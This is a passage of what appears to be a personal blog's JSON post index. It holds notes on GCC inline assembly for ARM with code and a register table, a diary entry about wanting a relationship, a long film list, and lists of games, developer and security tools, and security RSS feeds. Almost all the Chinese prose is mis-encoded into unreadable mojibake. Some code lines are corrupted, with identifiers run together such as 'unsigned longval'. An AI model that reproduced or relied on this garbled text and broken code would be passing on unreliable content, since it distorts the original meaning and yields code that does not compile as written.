ã€‚è¿™åœ¨å¤§å‹routineä¸­æ˜¯ä¸å¯ä»¥æ¥å—çš„ã€‚è¿™ç§æƒ…å†µä¸‹æœ€å¥½å®šä¹‰ä¸ªæ¡©å‡½æ•°ã€‚\nunsigned long ByteSwap(unsigned longval)\n{\nasm volatile (\nâ€‹ \"eor r3, %1, %1, ror #16\\n\\t\"\nâ€‹ \"bic r3, r3, #0x00FF0000\\n\\t\"\nâ€‹ \"mov %0, %1, ror #8\\n\\t\"\nâ€‹ \"eor %0, %0, r3, lsr #8\"\nâ€‹ : \"=r\" (val)\nâ€‹ : \"0\"(val)\nâ€‹ : \"r3\"\n);\nreturn val;\n}\næ›¿æ¢Cå˜é‡çš„ç¬¦å·å\né»˜è®¤çš„æƒ…å†µä¸‹ï¼ŒGCCä½¿ç”¨åŒå‡½æ•°æˆ–è€…å˜é‡ç›¸åŒçš„ç¬¦å·åã€‚ä½ å¯ä»¥ä½¿ç”¨asmå£°æ˜ï¼Œä¸ºæ±‡ç¼–ä»£ç æŒ‡å®šä¸€ä¸ªä¸åŒçš„ç¬¦å·å\nunsigned long value asm(\"clock\") = 3686400\nè¿™ä¸ªå£°æ˜å‘Šè¯‰ç¼–è¯‘å™¨ä½¿ç”¨äº†ç¬¦å·åclockä»£æ›¿äº†å…·ä½“çš„å€¼ã€‚\næ›¿æ¢Cå‡½æ•°çš„ç¬¦å·å\nä¸ºäº†æ”¹å˜å‡½æ•°åï¼Œä½ éœ€è¦ä¸€ä¸ªåŸå‹å£°æ˜ï¼Œå› ä¸ºç¼–è¯‘å™¨ä¸æ¥å—åœ¨å‡½æ•°å®šä¹‰ä¸­å‡ºç°asmå…³é”®å­—ã€‚\nextern long Calc(void) asm (\"CALCULATE\")\nè°ƒç”¨å‡½æ•°calc()å°†ä¼šåˆ›å»ºè°ƒç”¨å‡½æ•°CALCULATEçš„æ±‡ç¼–æŒ‡ä»¤ã€‚\nå¼ºåˆ¶ä½¿ç”¨ç‰¹å®šçš„å¯„å­˜å™¨\nå±€éƒ¨å˜é‡å¯èƒ½å­˜å‚¨åœ¨ä¸€ä¸ªå¯„å­˜å™¨ä¸­ã€‚ä½ å¯ä»¥åˆ©ç”¨å†…åµŒæ±‡ç¼–ä¸ºè¯¥å˜é‡æŒ‡å®šä¸€ä¸ªç‰¹å®šçš„å¯„å­˜å™¨ã€‚\nvoid Count(void) {\nregister unsigned char counterasm(\"r3\");\n... some code...\nasm volatile(\"eor r3, r3,r3\");\n... more code...\n}\næ±‡ç¼–æŒ‡ä»¤â€œeor r3, r3, r3â€ï¼Œä¼šå°†r3æ¸…é›¶ã€‚Waringï¼šè¯¥ä¾‹å­åœ¨åˆ°å¤šæ•°æƒ…å†µä¸‹æ˜¯æœ‰é—®é¢˜çš„ï¼Œå› ä¸ºè¿™å°†å’Œä¼˜åŒ–å™¨ç›¸å†²çªã€‚å› ä¸ºGCCä¸ä¼šé¢„ç•™å…¶å®ƒå¯„å­˜å™¨ã€‚è¦æ˜¯ä¼˜åŒ–å™¨è®¤ä¸ºè¯¥å˜é‡åœ¨ä»¥åä¸€æ®µæ—¶é—´æ²¡æœ‰ä½¿ç”¨ï¼Œé‚£ä¹ˆè¯¥å¯„å­˜å™¨å°†ä¼šè¢«å†æ¬¡ä½¿ç”¨ã€‚ä½†æ˜¯ç¼–è¯‘å™¨å¹¶æ²¡æœ‰èƒ½åŠ›å»æ£€æŸ¥æ˜¯å¦å’Œç¼–è¯‘å™¨é¢„å…ˆå®šä¹‰çš„å¯„å­˜å™¨æœ‰å†²çªã€‚å¦‚æœä½ ç”¨è¿™ç§æ–¹å¼æŒ‡å®šäº†å¤ªå¤šçš„å¯„å­˜å™¨ï¼Œç¼–è¯‘å™¨å°†ä¼šåœ¨ä»£ç ç”Ÿæˆçš„æ—¶å€™è€—å°½å¯„å­˜å™¨çš„ã€‚\nä¸´æ—¶ä½¿ç”¨å¯„å­˜å™¨\nå¦‚æœä½ ä½¿ç”¨äº†å¯„å­˜å™¨ï¼Œè€Œä½ æ²¡æœ‰åœ¨inputæˆ–output operandä¼ é€’ï¼Œé‚£ä¹ˆä½ å°±å¿…é¡»å‘ç¼–è¯‘å™¨æŒ‡æ˜è¿™äº›ã€‚ä¸‹é¢çš„ä¾‹å­ä¸­ä½¿ç”¨r3ä½œä¸ºscratch å¯„å­˜å™¨ï¼Œé€šè¿‡åœ¨clobber listä¸­å†™r3ï¼Œæ¥è®©ç¼–è¯‘å™¨å¾—çŸ¥ä½¿ç”¨è¯¥å¯„å­˜å™¨ã€‚ç”±äºandsæŒ‡ä»¤è·Ÿæ–°äº†çŠ¶æ€å¯„å­˜å™¨çš„æ ‡å¿—ä½ï¼Œä½¿ç”¨ccåœ¨clobber listä¸­æŒ‡æ˜ã€‚\nasm volatile(\n\"ands r3, %1, #3\" \"\\n\\t\"\n\"eor %0, %0, r3\" \"\\n\\t\"\n\"addne %0, #4\"\n: \"=r\" (len)\n: \"0\" (len)\n: \"cc\", \"r3\"\n);\næœ€å¥½çš„æ–¹æ³•æ˜¯ä½¿ç”¨æ¡©å‡½æ•°å¹¶ä¸”ä½¿ç”¨å±€éƒ¨ä¸´æ—¶å˜é‡\nå¯„å­˜å™¨çš„ç”¨é€”\næ¯”è¾ƒå¥½çš„æ–¹æ³•æ˜¯åˆ†æç¼–è¯‘åçš„æ±‡ç¼–åˆ—è¡¨ï¼Œå¹¶ä¸”å­¦ä¹ C ç¼–è¯‘å™¨ç”Ÿæˆçš„ä»£ç ã€‚ä¸‹é¢çš„åˆ—è¡¨æ˜¯ç¼–è¯‘å™¨å°†ARMæ ¸å¯„å­˜å™¨çš„å…¸å‹ç”¨é€”ï¼ŒçŸ¥é“è¿™äº›å°†æœ‰åŠ©äºç†è§£ä»£ç ã€‚\n   Register Alt. Name Usage     r0 a1 First function argumentInteger function resultScratch register   r1 a2 Second function argumentScratch register   r2 a3 Third function argumentScratch register   r3 a4 Fourth function argumentScratch register   r4 v1 Register variable   r5 v2 Register variable   r6 v3 Register variable   r7 v4 Register variable   r8 v5 Register variable=   r9 v6 rfpRegister variableReal frame pointer   r10 sl Stack limit   r11 fp Argument pointer   r12 ip Temporary workspace   r13 sp Stack pointer   r14 lr Link register Workspace   r15 pc Program counter    ","description":"","tags":[],"title":"ARM","uri":"/posts/arm/"},{"categories":null,"content":"love  love is a charming mysterious and magic thing. I wanna. é™ªä¼´æ˜¯æœ€é•¿æƒ…çš„å‘Šç™½ã€‚ å¸Œæœ›æœ‰ä¸€ä¸ªäººèƒ½é™ªæˆ‘èººåœ¨è‰åœ°ä¸Šä»°æœ›æ˜Ÿç©º å¸Œæœ›æœ‰ä¸€ä¸ªäººèƒ½é™ªæˆ‘èµ°åœ¨æ²™æ»©ä¸Šçœ‹æ½®æ¶¨æ½®è½ å¸Œæœ›æœ‰ä¸€ä¸ªäººèƒ½é™ªæˆ‘æ¼«æ­¥äºæ£®æ—æ„Ÿå—è‡ªç„¶çš„æ°”æ¯  å¸Œæœ›æœ‰ä¸€ä¸ªäººèƒ½é™ªæˆ‘ååœ¨é‚®è½®ä¸Šæ„Ÿå—å¤§æµ·çš„è¾½é˜” å¸Œæœ›æˆ‘èƒ½ä¸ä½ èµ°éå¤©ä¸‹ï¼Œæ„Ÿå°½å¤©ä¸‹å†·æš–ã€‚   I wanna. But she doesn't appear. The soulmate.    https://magic-king.net/love is waiting for u\næ˜¨å¤©åˆšçœ‹ TEDå…³äºçˆ±æƒ…çš„æ¼”è®²ï¼Œéƒ½è¯´çˆ±æƒ…æ˜¯çŒä¸åŠé˜²çš„ï¼Œä½†æ˜¯å¦‚æœä¸å»è¿½æ±‚ï¼Œæ€ä¹ˆä¼šå‘ç°è½¬è§’é‡åˆ°äº†çˆ±å‘¢ï¼Ÿ\n2019æˆ‘å°è¯•æ­è®ªè¿‡ï¼Œä¹Ÿå°è¯•çº¦ä¼šè¿‡ï¼Œä½†æ˜¯ä¸˜æ¯”ç‰¹ä¹Ÿå¥½åƒæ‰“æˆ‘missäº†\næˆ‘ä¸çŸ¥é“è¯¥æ€æ ·å»PUAï¼Œä½†æ˜¯æˆ‘çŸ¥é“æˆ‘çš„çœŸè¯š\næˆ‘è™½ç„¶æ˜¯æ…¢çƒ­ï¼Œä½†æ˜¯ç†Ÿæ‚‰èµ·æ¥æˆ‘å¯èƒ½èŠä¸ªå‡ å¤©å‡ å¤œä¹Ÿè¯´ä¸å®Œï¼Œåœ¨æƒ³éš¾é“åªæœ‰é«˜å†·åœ°å›ä¸€ä¸¤å¥æ‰èƒ½å°†å¯¹è¯è¿›è¡Œä¸‹å»å—ï¼Ÿæœç„¶æˆ‘è¿˜æ˜¯ä¸æ“…é•¿è¿™ç‚¹ã€‚ä¹Ÿæ­£å¦‚å‰äº›å¤©çœ‹æˆ¿æ€çªçš„åˆæ‹ä¹å›­æ‰€è®²çš„ï¼Œçˆ¶æ¯æ‰€æ•™çš„ä»€ä¹ˆæ•™è‚²éƒ½æœ‰ï¼Œå”¯ç‹¬ç¼ºå°‘äº†æ€§æ•™è‚²ï¼Œä»–ä»¬ä¸æ˜¯è¿˜æ²¡å¼€å§‹ï¼Œæ˜¯å·²ç»æ—·è¯¾äº†ã€‚æ‰€æœ‰çš„ä¸€åˆ‡æˆ‘éƒ½å°†è‡ªå·±å»æ¢ç´¢ï¼Œä»å°åˆ°å¤§ã€‚\næ˜å¹´å¤§æ¦‚å°±æ˜¯ä½›ç³»ä¸˜æ¯”ç‰¹äº†å§ï¼Œä¹Ÿå¸Œæœ›ä¸˜æ¯”ç‰¹ä¹‹ç®­èƒ½ä¸å†Missã€‚\næŠŠä½ å†™ä¸‹æ¥ï¼Œ12.21ä»Šå¤©çš„çªå‘å¥‡æƒ³ï¼Œæ¯•ç«Ÿæ˜å¹´ä¹Ÿè¦å‡†å¤‡ä½›ç³»äº†å˜›ï¼Œä¹Ÿè¦å‡†å¤‡å»è€ƒç ”äº†ã€‚\næƒ³æƒ³ä¸Šå¤§å­¦è¿™ä¸¤å¹´ï¼Œä½ çœŸçš„æ˜¯å°‘æ•°å‡ ä¸ªè®©æˆ‘å›ç¬¬ä¸‰çœ¼çš„å¥³å­©ã€‚ç¬¬ä¸€æ¬¡åœ¨18å¹´çš„å†¬è‡³æ™šä¼šä¸Šç¬¬ä¸€æ¬¡è§åˆ°ä½ ï¼Œå°±ä¸ç”±è‡ªä¸»åœ°æƒ³å¤šçœ‹ä½ å‡ çœ¼ã€‚å¤´ä¸Šç»‘ç€å¤´å¸¦ï¼Œä»¿ä½›å¦‚è¶Šå‰é¾™é©¬èˆ¬çš„coolã€‚æƒ³ç€ä¸€å®šè¦æåˆ°ä½ çš„è”ç³»æ–¹å¼ï¼Œæ²¡æƒ³åˆ°ä½ ä¸Šäº†å°ï¼ŒçŸ¥é“äº†ä½ çš„åå­—ã€‚åŸæœ¬è¿˜æƒ³ç€é—®ä½ åŒæ¡Œçš„äººï¼Œæ¯•ç«Ÿå½“æ—¶æˆ‘è¿˜æ²¡ç°åœ¨è¿™ä¹ˆå¤§èƒ†ï¼ˆè™½ç„¶ä¹Ÿè¿˜æŒºå®³ç¾çš„ã€‚ä¸è¿‡ï¼Œæˆ‘ç«Ÿç„¶æˆ‘å…ˆåœ¨ä¹‹å‰å› ä¸ºå¤©æ°”åŸå› é¸½æ‰çš„ç¯å…­æ ¡çš„å°ç»„é‡Œå°±åŠ äº†æˆ‘ï¼Œä¹Ÿæ˜¯æ„å¤–æƒŠå–œã€‚ä¾¿å¼€å§‹äº†å’Œä½ çš„èŠå¤©ã€‚ //TODOï¼šé€äº†ï¼Œçªç„¶å†™ä¸ä¸‹å»äº†ï¼Œå¯èƒ½æ—©ä¸Šçš„çµæ„Ÿæ²¡äº†å§\n å‡å¦‚æˆ‘ä»¥åè„±å•äº†ï¼Œä½ ä¹Ÿå–œæ¬¢ç©æ¸¸æˆçš„è¯\né‚£ä¹ˆæˆ‘ç°åœ¨è¿™Markä¸€ä¸‹å¥½ç©çš„å°ä¸œä¸œ\n åªåªå¤§å†’é™©ï¼šSteam äººç±»ï¼šä¸€è´¥æ¶‚åœ°ï¼šSteam åˆ†æ‰‹å‡ºå‘ï¼šovercookedï¼šSteam ç»§ç»­è¯´ï¼Œä¸ä¼šç‚¸ If you have a drunk friend é€ƒå‡ºç”Ÿå¤© åŠ¨ç‰©ä¹‹æ£®   ï¼ˆStick Fightï¼šThe Gameï¼ˆåšæŒæˆ˜æ–—ï¼šæ¸¸æˆï¼‰ï¼‰\nï¼ˆé©¬é‡Œå¥¥èµ›è½¦ï¼‰\nï¼ˆä¹±æ–—ç«æŸ´äººï¼‰\nhttps://www.bilibili.com/read/cv90137/\n å”‰ï¼Œä¸ºå•¥ä»Šå¤©å¬ç€è¿™æ— èŠçš„æ¯›æ¦‚ï¼Œå½·ä½›æƒ³èµ·äº†åˆäºŒæ— èŠç€å¬ç€å†å²è¯¾ï¼Œå´ä¾§å¤´å‡è£…çœ‹ç€çª—å¤–çš„ç»¿æ™¯ï¼Œå´çœ‹çš„æ˜¯ä½ çš„ç»ç¾ä¾§é¢œ\nå”‰ï¼Œå¿½ç„¶å¥½åƒè°ˆä¸ªæ‹çˆ±QAQ\nåªæƒ³æœ‰ä¸ªäººèƒ½å¤Ÿæ— æ‹˜æ— æŸçš„äº¤æµ\nç„¶åå†çœŸè¯šåœ°å¤¸å¤¸æˆ‘ï¼Œæˆ‘å¤§æ¦‚ä¼šé£˜ä¸Šå¤©å§\nBy 2020.04.29\n åˆç¡çš„æ—¶å€™ï¼Œæ€»é€‚åˆé™å¿ƒæ€è€ƒ\næƒ³å¿µé«˜ä¸­å–œæ¬¢ä½ çš„æ—¶å€™ï¼Œå°±å•çº¯çš„æƒ³è·Ÿä½ å‘†åœ¨ä¸€èµ·ï¼Œå•çº¯çš„å¯¹ä¸€ä¸ªäººå¥½ï¼Œç”œç”œçš„\nä»¿ä½›åªè¦å‘†åœ¨ä½ èº«è¾¹å°±ç‰¹åˆ«å¼€å¿ƒ\nç°åœ¨å˜›ï¼Œä¹Ÿä¸çŸ¥é“æƒ³ä¸æƒ³è°ˆæ‹çˆ±äº†\n ã€Šä½ æ›¾æ˜¯å°‘å¹´ã€‹\næœ‰äº›æ—¶å€™ ä½ æ€€å¿µä»å‰æ—¥å­\nå¯å¤©çœŸç¦»å¼€æ—¶ ä½ å´æ²¡è¯´ä¸€ä¸ªå­—\nä½ åªæ˜¯æŒ¥ä¸€æŒ¥æ‰‹ åƒæ‰”æ‰åºŸçº¸\nè¯´æ˜¯äººç”Ÿå¿…ç»çš„äº‹\né…’å–åˆ°ä¸ƒåˆ† å´åˆæ„Ÿè§‰æ€…ç„¶è‹¥å¤±\né•œå­é‡Œé¢ åƒçœ‹åˆ°äººç”Ÿç»ˆç‚¹\næˆ–è®¸å†è¿‡ä¸Šå‡ å¹´ ä½ ä¹Ÿæœ‰å¼ è™šä¼ªçš„è„¸\néš¾é“æˆ‘ä»¬ æ˜¯ä¸ºäº†è¿™æ · æ‰æ¥åˆ°è¿™ä¸–ä¸Š\nè¿™é—®é¢˜æ¥ä¸åŠæƒ³\næ¯ä¸€å¤©ä¸€å¹´ æ€»æ˜¯åŒ†åŒ†å¿™å¿™\n  å®³ï¼Œåœ¨æ•´ç†ä»¥å‰çš„ä¸œè¥¿æ—¶ï¼Œæ‰å‘ç°é‚£æ˜¯æœ¦èƒ§çš„æ„Ÿè§‰å¤šä¹ˆç¾å¥½ï¼Œé»˜é»˜åœ°åœ¨è®°ä½œä¸šæœ¬ä¸Šé»‘è‰²çš„å°é¢ç”¨é»‘è‰²çš„ç¬”å†™ä¸Šä½ çš„åå­—ï¼ˆä¹Ÿä¸çŸ¥å“ªçœ‹æ¥ï¼Œå—äº†è°çš„å½±å“ï¼‰\nå°±è¿å½“æ—¶ä½ å†™æˆ‘çš„åå­—ï¼Œæˆ‘ä¹Ÿç²¾å¿ƒæ”¶è—ç€\nè¿™å¤§æ¦‚å°±æ˜¯å¹´å°‘æ—¶çš„æœ¦èƒ§ä¹‹ç¾å§\nå¿½ç„¶ï¼Œåˆå¥½æƒ³å’Œä½ åœ¨ä¸€èµ·\nè¦æ˜¯é«˜ä¸­èƒ½åƒç°åœ¨çš„æˆ‘ä¸€æ ·å°±å¥½äº†\nBy 20200702\n æ˜¨å¤©è·‘æ­¥åˆçœ‹è§äº†ä¸€ä¸ªå’Œä½ å¥½åƒçš„äººï¼Œä¿æŒåŒ€é€Ÿä¸€èµ·è·‘äº†å¥½ä¹…ï¼Œå›æƒ³èµ·é«˜ä¸­ï¼Œå¿½ç„¶åˆå¥½æƒ³è°ˆæ‹çˆ±è¯•è¯•\nBy 20210113\n","description":"","tags":null,"title":"LOVE","uri":"/posts/love/"},{"categories":[],"content":"To the movie In the wanda   æˆ˜ç‹¼2   ç©ºå¤©çŒ   æè‡´è¿½å‡»   è‹±ä¼¦å¯¹å†³   çœ‹ä¸è§çš„å®¢äºº   ç¾ç¾çš„é“æ‹³   å¤©æ‰æªæ‰‹   ç‹ç‰Œç‰¹å·¥2ï¼šé»„é‡‘åœˆ   é“¶ç¿¼æ€æ‰‹2049   å…¨çƒé£æš´   é›·ç¥3ï¼šè¯¸ç¥é»„æ˜   ç²¾çµå®å¯æ¢¦ï¼š æ³¢å°”å‡¯å°¼æ©ä¸æœºå·§çš„é©¬æœºé›…å¨œ   æ­£ä¹‰è”ç›Ÿ   æè¢­æ³¢å£«é¡¿   æ¨ç†ç¬”è®°   çƒŸèŠ±   å¯»æ¢¦ç¯æ¸¸è®°   å·¨é¢æ¥ç”µ   å¸•ä¸é¡¿ç†Š2   é²¨æµ·   å¥‡é—¨éç”²   å¿ƒç†ç½ªä¹‹åŸå¸‚ä¹‹å…‰   èŠ³å   ç–¯ç‹‚ç‰¹è­¦é˜Ÿ   å¦–çŒ«ä¼    æœºå™¨ä¹‹è¡€   å¦–é“ƒé“ƒ   å‰ä»»3ï¼š å†è§å‰ä»»   äºŒä»£å¦–ç²¾ä¹‹ä»Šç”Ÿæœ‰å¹¸   æ˜Ÿçƒå¤§æˆ˜ï¼šæœ€åçš„ç»åœ°æ­¦å£«   å‹‡æ•¢è€…æ¸¸æˆï¼š å†³æˆ˜ä¸›æ—   æ— é—®è¥¿ä¸œ   è°œå·¢   è‹±é›„æœ¬è‰²2018   ç¥ç§˜å·¨æ˜Ÿ   ç§»åŠ¨è¿·å®«3ï¼š æ­»äº¡è§£è¯   ç»å‘½æ—¶é’Ÿ2ï¼š22   24å°æ—¶ï¼šæœ«è·¯é‡ç”Ÿ   å¿Œæ—¥å¿«ä¹   å—æä¹‹æ‹   å”äººè¡—æ¢æ¡ˆ2   çº¢æµ·è¡ŒåŠ¨   æ‰å¦–è®°2   å°èè‰çš„çŒ´ç¥å¤§å”   é»‘è±¹   è§£å¿§æ‚è´§åº—   å¤å¢“ä¸½å½±ï¼šèµ·æºä¹‹æˆ˜   ç¯å¤ªå¹³æ´‹ï¼šé›·éœ†å†èµ·   å¤´å·ç©å®¶   é€šå‹¤è¥æ•‘   èµ·è·‘çº¿   æ¹®ç­   è„±å•å‘Šæ€¥   å¹•åç©å®¶   åæ¥çš„æˆ‘ä»¬   å“†å•¦Aæ¢¦ï¼šå¤§é›„çš„é‡‘é“¶å²›   å¤ä»‡è€…è”ç›Ÿ3ï¼šæ— é™æˆ˜äº‰   è¶…æ—¶ç©ºåŒå±…   æ¸¸ä¾ ç´¢ç½—ï¼šæ˜Ÿçƒå¤§æˆ˜å¤–ä¼    æ·±æµ·è¶Šç‹±   ä¾ç½—çºªä¸–ç•Œ2   è¶…äººæ€»åŠ¨å‘˜2   é¾™è™¾åˆ‘è­¦   é‡‘è‰è„±å£³2   æˆ‘ä¸æ˜¯è¯ç¥   åŠ¨ç‰©ä¸–ç•Œ   é‚ªä¸å‹æ­£   æ‘©å¤©è¥æ•‘   è¥¿è™¹å¸‚é¦–å¯Œ   è§£ç æ¸¸æˆ   çˆ±æƒ…å…¬å¯“   ä¸€å‡ºå¥½æˆ   å¿«æŠŠæˆ‘å“¥å¸¦èµ°   æ¬§æ´²æ”»ç•¥   èšäºº2ï¼šé»„èœ‚å¥³ç°èº«   ç¢Ÿä¸­è°6ï¼šå…¨é¢ç“¦è§£   é˜¿å°”æ³•ï¼šç‹¼ä¼´å½’é€”   åè´ªé£æš´3   å½±   æ— åŒ   æèŒ¶çš„å§‘å¦ˆ   æˆ‘çš„é—´è°å‰ç”·å‹   é“è¡€æˆ˜å£«   æ˜¨æ—¥é’ç©º   æ¯’æ¶²ï¼šè‡´å‘½å®ˆæŠ¤è€…   ä½ å¥½ï¼Œä¹‹å   å†°å°ä¾ ï¼šæ—¶ç©ºè¡Œè€…   é£“é£å¥‡åŠ«   åä¾¦æ¢æŸ¯å—ï¼š é›¶çš„æ‰§è¡Œäºº   ç¥å¥‡åŠ¨ç‰©ï¼š æ ¼æ—å¾·æ²ƒä¹‹ç½ª   æ— æ•Œç ´åç‹2ï¼šå¤§é—¹äº’è”ç½‘   æ†¨è±†ç‰¹å·¥3   æ— åä¹‹è¾ˆ   æµ·ç‹   é¾™çŒ«   ç½‘ç»œè¿·è¸ª   å¤©æ°”é¢„çˆ†   æ¥ç”µç‹‚å“   èœ˜è››ä¾ ï¼šå¹³è¡Œå®‡å®™   åœ°çƒæœ€åçš„å¤œæ™š   å¤§é»„èœ‚   â€œå¤§â€äººç‰©   å‘½è¿ä¹‹å¤œâ€”â€”å¤©ä¹‹æ¯ï¼šæ¶å…†ä¹‹èŠ±   ç™½è›‡ï¼šç¼˜èµ·   å¯†å®¤é€ƒç”Ÿ   æ­»ä¾2ï¼šæˆ‘çˆ±æˆ‘å®¶   æ é£ŸåŸå¸‚   å»‰æ”¿é£äº‘4   æµæµªåœ°çƒ   ç–¯ç‹‚å¤–æ˜Ÿäºº   é£é©°äººç”Ÿ   ä¸€å»å®šæƒ…   é˜¿ä¸½å¡”ï¼šæˆ˜æ–—å¤©ä½¿   é©¯é¾™é«˜æ‰‹3   æƒŠå¥‡é˜Ÿé•¿   è¿‡æ˜¥å¤©   æ¯”æ‚²ä¼¤æ›´æ‚²ä¼¤çš„æ•…äº‹   æ³¢è¥¿ç±³äºšç‹‚æƒ³æ›²   ä¹é«˜å¤§ç”µå½±2   æµ·å¸‚èœƒæ¥¼   åè´ªé£æš´4   é£ä¸­æœ‰æœµé›¨åšçš„äº‘   é›·éœ†æ²™èµï¼   å¤ä»‡è€…è”ç›Ÿ4ï¼š ç»ˆå±€ä¹‹æˆ˜   ç¥ˆç¥·è½å¹•æ—¶   è°ƒéŸ³å¸ˆ   ä½•ä»¥ä¸ºå®¶   å¤§ä¾¦æ¢çš®å¡ä¸˜   é˜¿æ‹‰ä¸   å“¥æ–¯æ‹‰2ï¼šæ€ªå…½ä¹‹ç‹   å“†å•¦Aæ¢¦ï¼šå¤§é›„çš„æœˆçƒæ¢é™©   Xæˆ˜è­¦ï¼šé»‘å‡¤å‡°   è¿½é¾™II   ç»æ€æ…•å°¼é»‘   ç§¦æ˜Â·ç”Ÿæ­»è¯­è€…   é»‘è¡£äººï¼šå…¨çƒè¿½ç¼‰   ç©å…·æ€»åŠ¨å‘˜4   åƒä¸åƒå¯»   èœ˜è››ä¾ ï¼šè‹±é›„è¿œå¾   æ‰«æ¯’2ï¼šå¤©åœ°å¯¹å†³   çˆ±å® å¤§æœºå¯†2   å“ªå’ä¹‹é­”ç«¥é™ä¸–   çƒˆç«è‹±é›„   ä½¿å¾’è¡Œè€…2ï¼šç¢Ÿå½±è¡ŒåŠ¨   æ²‰é»˜çš„è¯äºº   å…¨èŒé«˜æ‰‹ä¹‹å·…å³°è£è€€   æ„¤æ€’çš„å°é¸Ÿ2   é“¤è€Œèµ°é™©   ç½—å°é»‘æˆ˜è®°   æ£€å¯Ÿæ–¹çš„ç½ªäºº   å®è±åæœºå™¨äºº2.0ï¼šé‡ç”Ÿå½’æ¥   ç½—å°é»‘æˆ˜è®°   åä¾¦æ¢æŸ¯å—ï¼šç»€é’ä¹‹æ‹³   è¯›ä»™I   å°Q   å‹æƒ…ä»¥ä¸Š   ä¸­å›½æœºé•¿   æˆ‘å’Œæˆ‘çš„ç¥–å›½   æ”€ç™»è€…   çŠ¯ç½ªç°åœº   èˆªæµ·ç‹ï¼šç‹‚çƒ­è¡ŒåŠ¨   åŒå­æ€æ‰‹   æ²‰ç¡é­”å’’2   å°‘å¹´çš„ä½    å¤©æ°”ä¹‹å­   ç»ˆç»“è€…ï¼šé»‘æš—å‘½è¿   å—ç›Šäºº   éœ¹é›³å¨‡å¨ƒ   æµ·ä¸Šé’¢ç´å¸ˆ   å†°é›ªå¥‡ç¼˜2   å†°å³°æš´   ä¸¤åªè€è™   å‹‡æ•¢è€…æ¸¸æˆ2ï¼šå†æˆ˜å·…å³°   è¯¯æ€   æ˜Ÿçƒå¤§æˆ˜ï¼šå¤©è¡Œè€…å´›èµ·   å¶é—®4ï¼šå®Œç»“ç¯‡   ç‰¹è­¦é˜Ÿ   å® çˆ±   äº²çˆ±çš„æ–°å¹´å¥½   å¤©ä½¿é™·è½   ç¾ä¸½äººç”Ÿ   å˜èº«ç‰¹å·¥   ä¸ºå®¶è€Œæˆ˜   ç´«ç½—å…°æ°¸æ’èŠ±å›­å¤–ä¼ ï¼šæ°¸è¿œä¸è‡ªåŠ¨æ‰‹è®°äººå¶   ç­ç»   å½“å¹¸ç¦æ¥æ•²é—¨   å–‹è¡€æˆ˜å£«   æ˜Ÿé™…ç©¿è¶Š   1917   å“ˆåˆ©æ³¢ç‰¹ä¸é­”æ³•çŸ³   å…«ä½°   ç›—æ¢¦ç©ºé—´   ä¿¡æ¡   å¤ºå†    æˆ‘å’Œæˆ‘çš„å®¶ä¹¡   å§œå­ç‰™   é‡‘åˆšå·   é™¤æš´   æ‹†å¼¹ä¸“å®¶2   é€ä½ ä¸€æœµå°çº¢èŠ±   å¿ƒçµå¥‡æ—…   ç¥å¥‡å¥³ä¾ 1984   è¾‘é­‚   å¤§çº¢åŒ…   æ­¦æ±‰æ—¥å¤œ   å”äººè¡—æ¢æ¡ˆ3   æ–°ç¥æ¦œï¼šå“ªå’é‡ç”Ÿ   åˆºæ€å°è¯´å®¶   çŒ«å’Œè€é¼    ä½ å¥½ï¼Œæç„•è‹±      ","description":"","tags":[],"title":"Movie","uri":"/posts/movie/"},{"categories":["Magic"],"content":"Magic Now You See ME ## **Magic Tree**   Game  uplay  Tom Clancy's Rainbow Six Siege Watch_Dogs Assassin Creed Tom Clancy's Ghost Recon Far Cry  origin  BattleField Mirror's Edge The Sims Apex Legends  steam   Wallpaper Engine\n  (Everything) xxx Simulator\n  Arma 3\n  Counter-Strike: Global Offensive\n  Chinese Parents\n  Detention\n  Dying Light\n  Getting Over It with Bennett Foddy\n  Grand Theft Auto V\n  Hacknet\n  Hitman\n  Hollow Knight\n  Human: Fall Flat\n  Left 4 Dead 1\u00262\n  LEGOÂ®\n  Life is Strange\n  Monster Hunter: World\n  No Man's Sky\n  Overcooked\n  Payday 2\n  Plague Inc: Evolved\n  PlayerUnknown's BattleGrounds\n  Portal\n  Raft\n  Risk of Rain 2\n  Sid Meier's Civilization V\n  Sniper Elite 4\n  Squad\n  Star Warsâ„¢\n  Terraria\n  The Walking Dead\n  The Witcher\n  This War of Mine\n  Vampyr\n  War Thunder\n  Worms\n  Bilzzard  OverWatch  wegame  Siege League of Legends  Others  MineCraft cs1.6 CSOL KeepTalkingAndNobodyIsExolose    To be continue\n   Coding  Editor  Atom Notepad++ (vim) (subline) Typora(Markdown) (VScode)  language  java gcc python (shell) (dos) (arm) (x86)  ssh  PuTTY XShell 8uftp  Revision Control  git Mercurial(hg) (svn)  Terminal  zsh cygwin cmder MinGW (Power Shell) (Git Bash)  IDE  eclipse IDEA CodeBlock CLion PyCharm  Databases  Mysql Navicat  Vmware   ubuntu 18.04LTS \u002616.04LTS \u0026 seedUbuntu\n  CentOS7\n  Kali-Linux\n  win10\n  win7\n  winXP\n  IDA Pro\n  Wireshark\n  Burp_Suite_Pro\n  To be continue\n   Magic Application    gpg4win\n  bandzip\n  XMind\n  CCleaner\n  ShadowSocks(ssr)\n  Sync\n  clashR\n  YY\n  ç½‘æ˜“UUåŠ é€Ÿå™¨\n  (Moss)\n  Internet Explore  Chrome FireFox  Adobe  PhoteShop AE Pr Flash Player  To be continue\n   Magic Rss   RssHubï¼š https://docs.rsshub.app/  paperï¼šhttps://paper.seebug.org/rss/ FreeBufï¼šhttps://www.freebuf.com/feed 52pojie.cnï¼š https://www.52pojie.cn/forum.php?mod=rss v2exå‘¨æŠ¥ï¼šhttp://vdaily.iu.vc/old-weekly.xml DEFCONï¼šhttps://www.defcon.org/defconrss.xml SecWiki Newsï¼šhttps://www.sec-wiki.com/news/rss Exploit-DB.comï¼šhttps://www.exploit-db.com/rss.xml NVDæœ€æ–°å…«å¤©æ¼æ´ï¼ˆCVEï¼‰ï¼š https://nvd.nist.gov/feeds/xml/cve/misc/nvd-rss.xml NVDè¿‘å…«å¤©å·²åˆ†ææ¼æ´ï¼š https://nvd.nist.gov/feeds/xml/cve/misc/nvd-rss-analyzed.xml å®‰å…¨å®¢æ··åˆä¸»é¡µèµ„è®¯ï¼š https://api.anquanke.com/data/v1/rss å®‰å…¨å®¢æœ€æ–°æ¼æ´åˆ—è¡¨ï¼š https://rsshub.app/aqk/vul Hacker Newsï¼šhttps://news.ycombinator.com/rss Sec-newsï¼šhttp://wiki.ioin.in/atom å¼€æºä¸­å›½ï¼šhttps://rsshub.app/oschina/news çœ‹é›ªï¼šhttps://rsshub.app/pediy/topic/ çœ‹é›ªpwnï¼šhttps://rsshub.app/pediy/topic/pwn/latest 